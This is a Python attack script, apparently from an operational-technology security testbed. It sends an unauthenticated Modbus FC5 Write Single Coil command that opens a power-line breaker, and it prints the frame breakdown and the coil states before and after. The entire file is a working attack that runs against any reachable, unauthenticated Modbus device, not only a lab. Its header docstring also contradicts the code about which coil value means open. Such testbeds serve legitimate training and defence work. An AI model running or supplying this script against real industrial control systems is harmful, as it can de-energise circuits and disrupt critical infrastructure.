#!/usr/bin/env python3
"""
OT Security Testbed — Scenario 2: Command Injection
=====================================================
Issues an unauthenticated FC5 Write Single Coil to trip a breaker
(coil 0 = line-650632.closed) from OPEN (True) to CLOSED (False).

Prints a full Modbus TCP frame breakdown before executing.

Usage:
    python3 scenario2_command_injection.py [--target 10.0.0.2] [--port 5502]
"""

import argparse
import struct
import sys
import time
from datetime import datetime

from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------
def parse_args():
    parser = argparse.ArgumentParser(description="Modbus command injection attack")
    parser.add_argument("--target", default="10.0.0.2", help="Target IP")
    parser.add_argument("--port", type=int, default=5502, help="Target port")
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def separator(char="─", width=60):
    print(char * width)


def read_coil(client, address):
    try:
        r = client.read_coils(address, count=1, device_id=1)
        if r.isError():
            return None
        return r.bits[0]
    except Exception:
        return None


def read_hr(client, address):
    """address is full Modbus address (30000-based); pymodbus 3.12 takes it directly."""
    try:
        r = client.read_holding_registers(address, count=1, device_id=1)
        if r.isError():
            return None
        return r.registers[0]
    except Exception:
        return None


def coil_state_str(val):
    if val is True:
        return "True  (CLOSED — line energised)"
    if val is False:
        return "False (OPEN  — line de-energised)"
    return f"{val} (read failed)"


# ---------------------------------------------------------------------------
# Frame breakdown
# ---------------------------------------------------------------------------
def print_fc5_frame(coil_address, value):
    """Print and explain the raw Modbus TCP Application Data Unit for FC5."""
    # FC5 coil value encoding: 0xFF00 = True (ON), 0x0000 = False (OFF)
    coil_val_word = 0xFF00 if value else 0x0000

    # Build the PDU (Protocol Data Unit): FC + coil_addr (2B) + value (2B)
    pdu = struct.pack(">BHH", 0x05, coil_address, coil_val_word)

    # Build MBAP (Modbus Application Protocol) header:
    # Transaction ID (2B) + Protocol ID (2B=0) + Length (2B) + Unit ID (1B)
    transaction_id = 0x0001
    protocol_id = 0x0000
    length = len(pdu) + 1  # includes unit_id byte
    unit_id = 0x01

    mbap = struct.pack(">HHHB", transaction_id, protocol_id, length, unit_id)
    full_frame = mbap + pdu

    print("\n[*] Modbus TCP Frame Breakdown (FC5 Write Single Coil)")
    separator()
    print(f"  Full frame (hex): {full_frame.hex(' ').upper()}")
    separator()
    print(f"  {'Field':<25} {'Bytes':<12} {'Value':<10} Meaning")
    separator("─", 70)

    rows = [
        ("Transaction ID",    f"{transaction_id:04X}",           str(transaction_id),  "Identifies this request"),
        ("Protocol ID",       f"{protocol_id:04X}",              "0",                  "Always 0 for Modbus"),
        ("Length",            f"{length:04X}",                   str(length),          f"Bytes remaining ({length})"),
        ("Unit ID",           f"{unit_id:02X}",                  str(unit_id),         "Slave address 1"),
        ("Function Code",     "05",                              "5 (FC5)",            "Write Single Coil"),
        ("Coil Address",      f"{coil_address:04X}",             str(coil_address),    f"Coil {coil_address}"),
        ("Coil Value",        f"{coil_val_word:04X}",            "0xFF00=ON/0=OFF",    "0xFF00=CLOSED 0x0000=OPEN"),
    ]

    for name, hex_val, dec_val, meaning in rows:
        print(f"  {name:<25} {hex_val:<12} {dec_val:<10} {meaning}")
    separator()

    target_state = "True (CLOSED)" if value else "False (OPEN)"
    print(f"  Intent: set coil {coil_address} to {target_state}")
    print(f"  Effect: line-650632.closed -> {'CLOSED' if value else 'OPEN'}")
    print()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    args = parse_args()

    print("=" * 60)
    print("  OT Security Testbed — Scenario 2: Command Injection")
    print(f"  Target: {args.target}:{args.port}")
    print(f"  Time:   {datetime.now().strftime('%Y-%m-%dT%H:%M:%S')}")
    print("=" * 60)

    client = ModbusTcpClient(args.target, port=args.port)
    if not client.connect():
        print(f"[!] Failed to connect to {args.target}:{args.port}")
        sys.exit(1)

    print(f"[+] Connected to {args.target}:{args.port}")

    # --- Pre-attack state ---
    print("\n[*] Pre-attack state:")
    separator()
    coil0_before = read_coil(client, 0)
    coil1_before = read_coil(client, 1)
    hr30000_before = read_hr(client, 30000)
    hr30001_before = read_hr(client, 30001)

    print(f"  Coil 0  (line-650632.closed): {coil_state_str(coil0_before)}")
    print(f"  Coil 1  (line-651634.closed): {coil_state_str(coil1_before)}")
    print(f"  HR 30000 (line-650632.kW):     {hr30000_before}")
    print(f"  HR 30001 (line-651634.kW):     {hr30001_before}")

    # --- Frame breakdown ---
    print_fc5_frame(coil_address=0, value=False)

    # --- Execute attack ---
    attack_time = datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]
    print(f"[!] Sending FC5 Write Coil 0 = False (OPEN) at {attack_time}")

    try:
        result = client.write_coil(0, False, device_id=1)
        attack_ok = not result.isError()
    except Exception as e:
        attack_ok = False
        print(f"[!] Exception during write: {e}")

    time.sleep(0.5)

    # --- Post-attack state ---
    print("\n[*] Post-attack state:")
    separator()
    coil0_after = read_coil(client, 0)
    coil1_after = read_coil(client, 1)
    hr30000_after = read_hr(client, 30000)
    hr30001_after = read_hr(client, 30001)

    print(f"  Coil 0  (line-650632.closed): {coil_state_str(coil0_after)}")
    print(f"  Coil 1  (line-651634.closed): {coil_state_str(coil1_after)}")
    print(f"  HR 30000 (line-650632.kW):     {hr30000_after}")
    print(f"  HR 30001 (line-651634.kW):     {hr30001_after}")

    client.close()

    # --- Before/after comparison ---
    print("\n[*] Before / After Comparison")
    separator("═", 60)
    print(f"  {'Tag':<30} {'Before':<20} {'After'}")
    separator("─", 60)
    print(f"  {'line-650632.closed (Coil 0)':<30} {str(coil0_before):<20} {str(coil0_after)}")
    print(f"  {'line-651634.closed (Coil 1)':<30} {str(coil1_before):<20} {str(coil1_after)}")
    print(f"  {'line-650632.kW    (HR 30000)':<30} {str(hr30000_before):<20} {str(hr30000_after)}")
    print(f"  {'line-651634.kW    (HR 30001)':<30} {str(hr30001_before):<20} {str(hr30001_after)}")
    separator("═", 60)

    # --- Verdict ---
    print()
    coil_changed = coil0_before is True and coil0_after is False
    if attack_ok and coil_changed:
        print("  *** ATTACK SUCCESSFUL ***")
        print("  Coil 0 flipped: line-650632 changed from CLOSED to OPEN.")
        print("  In a real substation this would de-energise the feeder circuit.")
    elif attack_ok and not coil_changed:
        print("  *** ATTACK FAILED ***")
        print(f"  Reason: write_coil() returned success but coil 0 read back as {coil0_after}.")
        print("  Possible cause: server-side validation or address mismatch.")
    else:
        print("  *** ATTACK FAILED ***")
        print("  Reason: write_coil() returned an error response.")
    print()


if __name__ == "__main__":
    main()
